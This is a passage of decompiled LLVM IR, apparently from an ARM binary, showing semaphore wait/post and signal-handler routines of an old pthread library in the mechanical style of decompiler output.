  uselistorder i32* %r2.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1deac, { 1, 0 }
  uselistorder label %dec_label_pc_1dea8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1de9c, { 1, 0 }
  uselistorder label %dec_label_pc_1de50, { 1, 0 }
  uselistorder label %dec_label_pc_1de40, { 1, 0 }
  uselistorder label %dec_label_pc_1ddc4, { 1, 0 }
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1decc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_1ded4 = call i32 @_thread_self()
  %v0_1def0 = load i32, i32* @r4, align 4
  store i32 %v0_1def0, i32* @r0, align 4
  store i32 %v0_1def0, i32* %stack_var_-28, align 4
  %v0_1defc = call i32 @__pthread_lock()
  %v0_1df00 = load i32, i32* @r4, align 4
  %v1_1df00 = add i32 %v0_1df00, 8
  %v2_1df00 = inttoptr i32 %v1_1df00 to i32*
  %v3_1df00 = load i32, i32* %v2_1df00, align 4
  %tmp13 = icmp slt i32 %v3_1df00, 1
  br i1 %tmp13, label %dec_label_pc_1df20, label %dec_label_pc_1df0c

dec_label_pc_1df0c:                               ; preds = %entry
  %v1_1df0c = add i32 %v3_1df00, -1
  store i32 %v1_1df0c, i32* %v2_1df00, align 4
  %v0_1df14 = load i32, i32* @r4, align 4
  %v1_1df18 = call i32 @__pthread_unlock(i32 %v0_1df14)
  br label %dec_label_pc_1e004

dec_label_pc_1df20:                               ; preds = %entry
  %v3_1df28 = add i32 %v0_1ded4, 322
  %v4_1df28 = inttoptr i32 %v3_1df28 to i8*
  store i8 0, i8* %v4_1df28, align 1
  %v2_1df30 = ptrtoint i32* %stack_var_-28 to i32
  %v2_1df34 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1ded4, i32 %v2_1df30)
  %v1_1df3c = add i32 %v0_1ded4, 66
  %v2_1df3c = inttoptr i32 %v1_1df3c to i8*
  %v3_1df3c = load i8, i8* %v2_1df3c, align 1
  %v2_1df40 = icmp eq i8 %v3_1df3c, 0
  br i1 %v2_1df40, label %dec_label_pc_1df5c, label %dec_label_pc_1df48

dec_label_pc_1df48:                               ; preds = %dec_label_pc_1df20
  %v1_1df4c = add i32 %v0_1ded4, 64
  %v2_1df4c = inttoptr i32 %v1_1df4c to i8*
  %v3_1df4c = load i8, i8* %v2_1df4c, align 1
  %v2_1df50 = icmp eq i8 %v3_1df4c, 0
  br i1 %v2_1df50, label %dec_label_pc_1df6c, label %dec_label_pc_1df5c

dec_label_pc_1df5c:                               ; preds = %dec_label_pc_1df48, %dec_label_pc_1df20
  %v0_1df60 = load i32, i32* @r4, align 4
  %v1_1df60 = add i32 %v0_1df60, 12
  %v2_1df64 = call i32 @enqueue(i32 %v1_1df60, i32 %v0_1ded4)
  br label %dec_label_pc_1df6c

dec_label_pc_1df6c:                               ; preds = %dec_label_pc_1df48, %dec_label_pc_1df5c
  %storemerge = phi i32 [ 0, %dec_label_pc_1df5c ], [ 1, %dec_label_pc_1df48 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_1df6c = load i32, i32* @r4, align 4
  %v1_1df70 = call i32 @__pthread_unlock(i32 %v0_1df6c)
  %v0_1df74 = load i32, i32* @r5, align 4
  %v2_1df74 = icmp eq i32 %v0_1df74, 0
  store i32 %v0_1ded4, i32* @r0, align 4
  br i1 %v2_1df74, label %dec_label_pc_1df8c.preheader, label %dec_label_pc_1df7c

dec_label_pc_1df8c.preheader:                     ; preds = %dec_label_pc_1df6c
  %v1_1df901 = call i32 @suspend(i32 %v0_1ded4)
  %v3_1df982 = load i8, i8* %v4_1df28, align 1
  %v2_1df9c4 = icmp eq i8 %v3_1df982, 0
  %v1_1dfa8 = add i32 %v0_1ded4, 320
  %v2_1dfa8 = inttoptr i32 %v1_1dfa8 to i8*
  br i1 %v2_1df9c4, label %dec_label_pc_1dfa4.lr.ph, label %dec_label_pc_1dfc4

dec_label_pc_1dfa4.lr.ph:                         ; preds = %dec_label_pc_1df8c.preheader
  %v1_1dfb8 = add i32 %v0_1ded4, 64
  %v2_1dfb8 = inttoptr i32 %v1_1dfb8 to i8*
  br label %dec_label_pc_1dfa4

dec_label_pc_1df7c:                               ; preds = %dec_label_pc_1df6c
  %v2_1df84 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1ded4, i32 0)
  br label %dec_label_pc_1dff8

dec_label_pc_1dfa4:                               ; preds = %dec_label_pc_1dfa4.lr.ph, %dec_label_pc_1df8c.backedge
  %v3_1dfa8 = load i8, i8* %v2_1dfa8, align 1
  %v2_1dfac = icmp eq i8 %v3_1dfa8, 0
  br i1 %v2_1dfac, label %dec_label_pc_1df8c.backedge, label %dec_label_pc_1dfb4

dec_label_pc_1df8c.backedge:                      ; preds = %dec_label_pc_1dfa4, %dec_label_pc_1dfb4
  store i32 %v0_1ded4, i32* @r0, align 4
  %v1_1df90 = call i32 @suspend(i32 %v0_1ded4)
  %v3_1df98 = load i8, i8* %v4_1df28, align 1
  %v2_1df9c = icmp eq i8 %v3_1df98, 0
  br i1 %v2_1df9c, label %dec_label_pc_1dfa4, label %dec_label_pc_1dfc4

dec_label_pc_1dfb4:                               ; preds = %dec_label_pc_1dfa4
  %v3_1dfb8 = load i8, i8* %v2_1dfb8, align 1
  %v2_1dfbc = icmp eq i8 %v3_1dfb8, 0
  br i1 %v2_1dfbc, label %dec_label_pc_1dfc4, label %dec_label_pc_1df8c.backedge

dec_label_pc_1dfc4:                               ; preds = %dec_label_pc_1df8c.backedge, %dec_label_pc_1dfb4, %dec_label_pc_1df8c.preheader
  %v2_1dfcc = call i32 @__pthread_set_own_extricate_if(i32 %v0_1ded4, i32 0)
  %v3_1dfd4 = load i8, i8* %v2_1dfa8, align 1
  %v2_1dfd8 = icmp eq i8 %v3_1dfd4, 0
  br i1 %v2_1dfd8, label %dec_label_pc_1e004, label %dec_label_pc_1dfe0

dec_label_pc_1dfe0:                               ; preds = %dec_label_pc_1dfc4
  %v1_1dfe4 = add i32 %v0_1ded4, 64
  %v2_1dfe4 = inttoptr i32 %v1_1dfe4 to i8*
  %v3_1dfe4 = load i8, i8* %v2_1dfe4, align 1
  %v2_1dfe8 = icmp eq i8 %v3_1dfe4, 0
  br i1 %v2_1dfe8, label %dec_label_pc_1dff0, label %dec_label_pc_1e004

dec_label_pc_1dff0:                               ; preds = %dec_label_pc_1dfe0
  store i8 0, i8* %v2_1dfa8, align 1
  br label %dec_label_pc_1dff8

dec_label_pc_1dff8:                               ; preds = %dec_label_pc_1df7c, %dec_label_pc_1dff0
  %v2_1e000 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_1decc)
  br label %dec_label_pc_1e004

dec_label_pc_1e004:                               ; preds = %dec_label_pc_1dfe0, %dec_label_pc_1dfc4, %dec_label_pc_1df0c, %dec_label_pc_1dff8
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_1df28, { 1, 0, 2 }
  uselistorder i32 %v0_1ded4, { 4, 5, 9, 8, 3, 6, 7, 0, 1, 10, 2, 12, 11, 13 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @suspend, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @enqueue, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1e004, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1dff8, { 1, 0 }
  uselistorder label %dec_label_pc_1dfc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1df8c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1dfa4, { 1, 0 }
  uselistorder label %dec_label_pc_1df6c, { 1, 0 }
}

define i32 @__new_sem_post(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v6_1e01c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1e028 = call i32 @_thread_self()
  %v1_1e02c = add i32 %v0_1e028, 84
  %v2_1e02c = inttoptr i32 %v1_1e02c to i32*
  %v3_1e02c = load i32, i32* %v2_1e02c, align 4
  store i32 %v3_1e02c, i32* @r6, align 4
  %v2_1e034 = icmp eq i32 %v3_1e02c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  br i1 %v2_1e034, label %dec_label_pc_1e040, label %dec_label_pc_1e0c4

dec_label_pc_1e040:                               ; preds = %entry
  %v0_1e044 = load i32, i32* @r4, align 4
  store i32 %v0_1e044, i32* @r0, align 4
  %v0_1e048 = call i32 @__pthread_lock()
  %v0_1e04c = load i32, i32* @r4, align 4
  %v1_1e04c = add i32 %v0_1e04c, 12
  %v2_1e04c = inttoptr i32 %v1_1e04c to i32*
  %v3_1e04c = load i32, i32* %v2_1e04c, align 4
  store i32 %v3_1e04c, i32* %r5.global-to-local, align 4
  %v2_1e050 = icmp eq i32 %v3_1e04c, 0
  br i1 %v2_1e050, label %dec_label_pc_1e058, label %dec_label_pc_1e098

dec_label_pc_1e058:                               ; preds = %dec_label_pc_1e040
  %v1_1e058 = add i32 %v0_1e04c, 8
  %v2_1e058 = inttoptr i32 %v1_1e058 to i32*
  %v3_1e058 = load i32, i32* %v2_1e058, align 4
  %v4_1e060 = icmp eq i32 %v3_1e058, 2147483647
  br i1 %v4_1e060, label %dec_label_pc_1e064, label %dec_label_pc_1e080

dec_label_pc_1e064:                               ; preds = %dec_label_pc_1e058
  %v0_1e064 = call i32 @__errno_location()
  %v2_1e06c = inttoptr i32 %v0_1e064 to i32*
  store i32 34, i32* %v2_1e06c, align 4
  %v0_1e070 = load i32, i32* @r4, align 4
  %v1_1e074 = call i32 @__pthread_unlock(i32 %v0_1e070)
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e13c

dec_label_pc_1e080:                               ; preds = %dec_label_pc_1e058
  %v5_1e05c = add i32 %v3_1e058, 1
  store i32 %v5_1e05c, i32* %v2_1e058, align 4
  %v0_1e088 = load i32, i32* @r4, align 4
  %v1_1e08c = call i32 @__pthread_unlock(i32 %v0_1e088)
  %v0_1e090 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1e090, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e13c

dec_label_pc_1e098:                               ; preds = %dec_label_pc_1e040
  %v1_1e098 = add i32 %v3_1e04c, 8
  %v2_1e098 = inttoptr i32 %v1_1e098 to i32*
  %v3_1e098 = load i32, i32* %v2_1e098, align 4
  store i32 %v3_1e098, i32* %v2_1e04c, align 4
  %v0_1e0a4 = load i32, i32* @r6, align 4
  %v1_1e0a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e0a4 = add i32 %v1_1e0a4, 8
  %v3_1e0a4 = inttoptr i32 %v2_1e0a4 to i32*
  store i32 %v0_1e0a4, i32* %v3_1e0a4, align 4
  %v1_1e0a8 = call i32 @__pthread_unlock(i32 %v0_1e04c)
  %v2_1e0b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_1e0b0 = add i32 %v2_1e0b0, 322
  %v4_1e0b0 = inttoptr i32 %v3_1e0b0 to i8*
  store i8 1, i8* %v4_1e0b0, align 1
  %v0_1e0b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1e0b4, i32* @r0, align 4
  %v0_1e0b8 = call i32 @__pthread_restart_new()
  %v0_1e0bc = load i32, i32* @r6, align 4
  store i32 %v0_1e0bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e13c

dec_label_pc_1e0c4:                               ; preds = %entry
  %v4_1e0c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 132) to i32*), align 4
  %v1_1e0cc = inttoptr i32 %v4_1e0c8 to i32*
  %v2_1e0cc = load i32, i32* %v1_1e0cc, align 4
  %v1_1e0d0 = icmp slt i32 %v2_1e0cc, 0
  br i1 %v1_1e0d0, label %dec_label_pc_1e0d8, label %dec_label_pc_1e0f8

dec_label_pc_1e0d8:                               ; preds = %dec_label_pc_1e0c4
  %v0_1e0d8 = call i32 @__pthread_initialize_manager()
  %v1_1e0dc = icmp slt i32 %v0_1e0d8, 0
  br i1 %v1_1e0dc, label %dec_label_pc_1e0e4, label %dec_label_pc_1e0d8.dec_label_pc_1e0f8_crit_edge

dec_label_pc_1e0d8.dec_label_pc_1e0f8_crit_edge:  ; preds = %dec_label_pc_1e0d8
  %v0_1e104.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e0f8

dec_label_pc_1e0e4:                               ; preds = %dec_label_pc_1e0d8
  %v0_1e0e4 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1e0f0 = inttoptr i32 %v0_1e0e4 to i32*
  store i32 11, i32* %v2_1e0f0, align 4
  %v0_1e13c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e13c

dec_label_pc_1e0f8:                               ; preds = %dec_label_pc_1e0d8.dec_label_pc_1e0f8_crit_edge, %dec_label_pc_1e0c4
  %v0_1e104 = phi i32 [ %v0_1e104.pre, %dec_label_pc_1e0d8.dec_label_pc_1e0f8_crit_edge ], [ ptrtoint (i32* @global_var_44990.1184 to i32), %dec_label_pc_1e0c4 ]
  %v2_1e104 = add i32 %v0_1e104, 132
  %v3_1e104 = inttoptr i32 %v2_1e104 to i32*
  %v4_1e104 = load i32, i32* %v3_1e104, align 4
  store i32 %v4_1e104, i32* @r5, align 4
  %v2_1e10c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1e10c, i32* @r4, align 4
  br label %dec_label_pc_1e110

dec_label_pc_1e110:                               ; preds = %dec_label_pc_1e128.dec_label_pc_1e110_crit_edge, %dec_label_pc_1e0f8
  %v0_1e118 = phi i32 [ %v0_1e118.pre, %dec_label_pc_1e128.dec_label_pc_1e110_crit_edge ], [ %v4_1e104, %dec_label_pc_1e0f8 ]
  store i32 28, i32* %r2.global-to-local, align 4
  %v1_1e118 = inttoptr i32 %v0_1e118 to i32*
  %v2_1e118 = load i32, i32* %v1_1e118, align 4
  %v3_1e11c = call i32 @write(i32 %v2_1e118, i32 %v2_1e10c, i32 28)
  %v3_1e120 = icmp eq i32 %v3_1e11c, -1
  br i1 %v3_1e120, label %dec_label_pc_1e128, label %dec_label_pc_1e138

dec_label_pc_1e128:                               ; preds = %dec_label_pc_1e110
  %v0_1e128 = call i32 @__errno_location()
  %v1_1e12c = inttoptr i32 %v0_1e128 to i32*
  %v2_1e12c = load i32, i32* %v1_1e12c, align 4
  %v7_1e130 = icmp eq i32 %v2_1e12c, 4
  br i1 %v7_1e130, label %dec_label_pc_1e128.dec_label_pc_1e110_crit_edge, label %dec_label_pc_1e138

dec_label_pc_1e128.dec_label_pc_1e110_crit_edge:  ; preds = %dec_label_pc_1e128
  %v0_1e118.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1e110

dec_label_pc_1e138:                               ; preds = %dec_label_pc_1e110, %dec_label_pc_1e128
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e13c

dec_label_pc_1e13c:                               ; preds = %dec_label_pc_1e0e4, %dec_label_pc_1e098, %dec_label_pc_1e080, %dec_label_pc_1e064, %dec_label_pc_1e138
  %v0_1e13c = phi i32 [ %v0_1e13c.pre, %dec_label_pc_1e0e4 ], [ %v0_1e0bc, %dec_label_pc_1e098 ], [ %v0_1e090, %dec_label_pc_1e080 ], [ -1, %dec_label_pc_1e064 ], [ 0, %dec_label_pc_1e138 ]
  store i32 %v6_1e01c, i32* %r5.global-to-local, align 4
  ret i32 %v0_1e13c

; uselistorder directives
  uselistorder i32 %v3_1e058, { 1, 0 }
  uselistorder i32 %v0_1e04c, { 1, 0, 2 }
  uselistorder i32 ()* @_thread_self, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1e13c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1e138, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v1_1e154 = load i32, i32* @r0, align 4
  ret i32 %v1_1e154
}

define i32 @_thread_self.1() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_1e15c = load i32, i32* @lr, align 4
  store i32 %v0_1e15c, i32* %stack_var_-4, align 4
  %v4_1e168 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_1e16c = inttoptr i32 %v4_1e168 to i32*
  %v2_1e16c = load i32, i32* %v1_1e16c, align 4
  %v2_1e170 = ptrtoint i32* %stack_var_-8 to i32
  %v3_1e174 = icmp ult i32 %v2_1e170, %v2_1e16c
  br i1 %v3_1e174, label %dec_label_pc_1e184, label %dec_label_pc_1e1b0

dec_label_pc_1e184:                               ; preds = %entry
  %v4_1e188 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_1e18c = inttoptr i32 %v4_1e188 to i32*
  %v2_1e18c = load i32, i32* %v1_1e18c, align 4
  %v3_1e190 = icmp ult i32 %v2_1e170, %v2_1e18c
  br i1 %v3_1e190, label %dec_label_pc_1e1b8, label %dec_label_pc_1e198

dec_label_pc_1e198:                               ; preds = %dec_label_pc_1e184
  %v4_1e19c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_1e1a0 = inttoptr i32 %v4_1e19c to i32*
  %v2_1e1a0 = load i32, i32* %v1_1e1a0, align 4
  %v3_1e1a4 = icmp ult i32 %v2_1e170, %v2_1e1a0
  br i1 %v3_1e1a4, label %dec_label_pc_1e1b0, label %dec_label_pc_1e1b8

dec_label_pc_1e1b0:                               ; preds = %dec_label_pc_1e198, %entry
  %v1_1e1b0 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_1e198 ]
  %v3_1e1b0 = inttoptr i32 %v1_1e1b0 to i32*
  %v4_1e1b0 = load i32, i32* %v3_1e1b0, align 4
  br label %dec_label_pc_1e1e4

dec_label_pc_1e1b8:                               ; preds = %dec_label_pc_1e198, %dec_label_pc_1e184
  %v4_1e1bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_1e1c0 = inttoptr i32 %v4_1e1bc to i32*
  %v2_1e1c0 = load i32, i32* %v1_1e1c0, align 4
  %v2_1e1c4 = icmp eq i32 %v2_1e1c0, 0
  br i1 %v2_1e1c4, label %dec_label_pc_1e1d4, label %dec_label_pc_1e1cc

dec_label_pc_1e1cc:                               ; preds = %dec_label_pc_1e1b8
  %v0_1e1cc = call i32 @__pthread_find_self()
  %v2_1e1e8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1e1e4

dec_label_pc_1e1d4:                               ; preds = %dec_label_pc_1e1b8
  %v3_1e1d4 = and i32 %v2_1e170, -2097152
  %v4_1e1d4 = xor i32 %v3_1e1d4, -2097152
  %v1_1e1e0 = sub i32 -352, %v4_1e1d4
  br label %dec_label_pc_1e1e4

dec_label_pc_1e1e4:                               ; preds = %dec_label_pc_1e1cc, %dec_label_pc_1e1b0, %dec_label_pc_1e1d4
  %v1_1e1ec = phi i32 [ %v0_1e1cc, %dec_label_pc_1e1cc ], [ %v4_1e1b0, %dec_label_pc_1e1b0 ], [ %v1_1e1e0, %dec_label_pc_1e1d4 ]
  %v2_1e1e8 = phi i32 [ %v2_1e1e8.pre, %dec_label_pc_1e1cc ], [ %v0_1e15c, %dec_label_pc_1e1b0 ], [ %v0_1e15c, %dec_label_pc_1e1d4 ]
  store i32 %v2_1e1e8, i32* @lr, align 4
  ret i32 %v1_1e1ec

; uselistorder directives
  uselistorder label %dec_label_pc_1e1e4, { 2, 0, 1 }
}

define i32 @function_1e1f4(i16* %arg1) local_unnamed_addr {
dec_label_pc_1e1f4:
  %v0_1e1f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e1f4, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_1e1f4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1e1f4
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1e20c = load i32, i32* @r4, align 4
  store i32 %v3_1e20c, i32* %stack_var_-24, align 4
  %v19_1e20c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  %v0_1e21c = call i32 @_thread_self.1()
  store i32 %v0_1e21c, i32* %r0.global-to-local, align 4
  %v1_1e220 = add i32 %v0_1e21c, 88
  %v2_1e220 = inttoptr i32 %v1_1e220 to i8*
  %v3_1e220 = load i8, i8* %v2_1e220, align 1
  %v4_1e220 = zext i8 %v3_1e220 to i32
  store i32 %v4_1e220, i32* %r3.global-to-local, align 4
  store i32 157528, i32* %r2.global-to-local, align 4
  %v2_1e228 = icmp eq i8 %v3_1e220, 0
  store i1 %v2_1e228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e228, label %.thread5, label %.thread2

.thread5:                                         ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_1e21c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1e244

.thread2:                                         ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_1e21c, i32* %r5.global-to-local, align 4
  %v1_1e238 = load i32, i32* %r6.global-to-local, align 4
  %v3_1e238 = add i32 %v0_1e21c, 32
  %v4_1e238 = inttoptr i32 %v3_1e238 to i32*
  store i32 %v1_1e238, i32* %v4_1e238, align 4
  %v1_1e23c = load i32, i32* %r3.global-to-local, align 4
  %v2_1e23c = trunc i32 %v1_1e23c to i8
  %v3_1e23c = load i32, i32* %r0.global-to-local, align 4
  %v4_1e23c = add i32 %v3_1e23c, 88
  %v5_1e23c = inttoptr i32 %v4_1e23c to i8*
  store i8 %v2_1e23c, i8* %v5_1e23c, align 1
  %v0_1e240.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1e240.pr.pr, label %.thread2.dec_label_pc_1e244_crit_edge, label %bb14

.thread2.dec_label_pc_1e244_crit_edge:            ; preds = %.thread2
  %v0_1e244.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e244

dec_label_pc_1e244:                               ; preds = %.thread2.dec_label_pc_1e244_crit_edge, %.thread5
  %v0_1e244 = phi i32 [ %v0_1e244.pre, %.thread2.dec_label_pc_1e244_crit_edge ], [ %v0_1e21c, %.thread5 ]
  %v1_1e244 = add i32 %v0_1e244, 84
  %v2_1e244 = inttoptr i32 %v1_1e244 to i32*
  %v3_1e244 = load i32, i32* %v2_1e244, align 4
  store i32 %v3_1e244, i32* %r4.global-to-local, align 4
  store i32 38396, i32* %r3.global-to-local, align 4
  %v2_1e24c = icmp eq i32 %v3_1e244, 0
  store i1 %v2_1e24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e24c, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_1e244
  store i32 %v19_1e20c, i32* %v2_1e244, align 4
  %v1_1e254.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1e244, %bb
  %v1_1e254 = phi i32 [ 38396, %dec_label_pc_1e244 ], [ %v1_1e254.pre, %bb ]
  %v0_1e254 = load i32, i32* %r2.global-to-local, align 4
  %v2_1e254 = add i32 %v0_1e254, %v1_1e254
  store i32 %v2_1e254, i32* %r3.global-to-local, align 4
  %v0_1e25c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1e25c, i32* %r2.global-to-local, align 4
  %v0_1e260 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1e260, i32* %r0.global-to-local, align 4
  %v4_1e264 = mul i32 %v0_1e260, 4
  %v5_1e264 = add i32 %v4_1e264, %v2_1e254
  %v6_1e264 = inttoptr i32 %v5_1e264 to i32*
  %v7_1e264 = load i32, i32* %v6_1e264, align 4
  call void @__pseudo_branch(i32 %v7_1e264)
  %v0_1e270 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e270 = icmp eq i32 %v0_1e270, 0
  store i1 %v2_1e270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e270, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1e274 = load i32, i32* %r5.global-to-local, align 4
  %v3_1e274 = add i32 %v2_1e274, 84
  %v4_1e274 = inttoptr i32 %v3_1e274 to i32*
  store i32 0, i32* %v4_1e274, align 4
  br label %bb14

bb14:                                             ; preds = %.thread2, %bb12, %bb13
  %v2_1e278 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1e278, i32* %r4.global-to-local, align 4
  %v1_1e27c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1e27c

; uselistorder directives
  uselistorder i32 %v0_1e21c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 4, 2, 5, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 0 }
  uselistorder label %bb14, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v3_1e288 = load i32, i32* @r4, align 4
  %v2_1e28c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v0_1e2a0 = call i32 @_thread_self.1()
  store i32 %v0_1e2a0, i32* %r0.global-to-local, align 4
  %v1_1e2a4 = add i32 %v0_1e2a0, 88
  %v2_1e2a4 = inttoptr i32 %v1_1e2a4 to i8*
  %v3_1e2a4 = load i8, i8* %v2_1e2a4, align 1
  %v4_1e2a4 = zext i8 %v3_1e2a4 to i32
  store i32 %v4_1e2a4, i32* @r3, align 4
  %v2_1e2ac = icmp eq i8 %v3_1e2a4, 0
  store i1 %v2_1e2ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e2ac, label %.thread5, label %.thread2

.thread5:                                         ; preds = %entry
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  store i32 %v0_1e2a0, i32* @r5, align 4
  br label %dec_label_pc_1e2c8

.thread2:                                         ; preds = %entry
  store i32 0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @ip, align 4
  store i32 %v0_1e2a0, i32* @r5, align 4
  %v1_1e2bc = load i32, i32* %r7.global-to-local, align 4
  %v3_1e2bc = add i32 %v0_1e2a0, 32
  %v4_1e2bc = inttoptr i32 %v3_1e2bc to i32*
  store i32 %v1_1e2bc, i32* %v4_1e2bc, align 4
  %v1_1e2c0 = load i32, i32* @r3, align 4
  %v2_1e2c0 = trunc i32 %v1_1e2c0 to i8
  %v3_1e2c0 = load i32, i32* %r0.global-to-local, align 4
  %v4_1e2c0 = add i32 %v3_1e2c0, 88
  %v5_1e2c0 = inttoptr i32 %v4_1e2c0 to i8*
  store i8 %v2_1e2c0, i8* %v5_1e2c0, align 1
  %v0_1e2c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1e2c4.pr.pr, label %.thread2.dec_label_pc_1e2c8_crit_edge, label %.thread2._crit_edge

.thread2.dec_label_pc_1e2c8_crit_edge:            ; preds = %.thread2
  %v0_1e2c8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e2c8

.thread2._crit_edge:                              ; preds = %.thread2
  br label %bb17

dec_label_pc_1e2c8:                               ; preds = %.thread2.dec_label_pc_1e2c8_crit_edge, %.thread5
  %v0_1e2c8 = phi i32 [ %v0_1e2c8.pre, %.thread2.dec_label_pc_1e2c8_crit_edge ], [ %v0_1e2a0, %.thread5 ]
  %v1_1e2c8 = add i32 %v0_1e2c8, 84
  %v2_1e2c8 = inttoptr i32 %v1_1e2c8 to i32*
  %v3_1e2c8 = load i32, i32* %v2_1e2c8, align 4
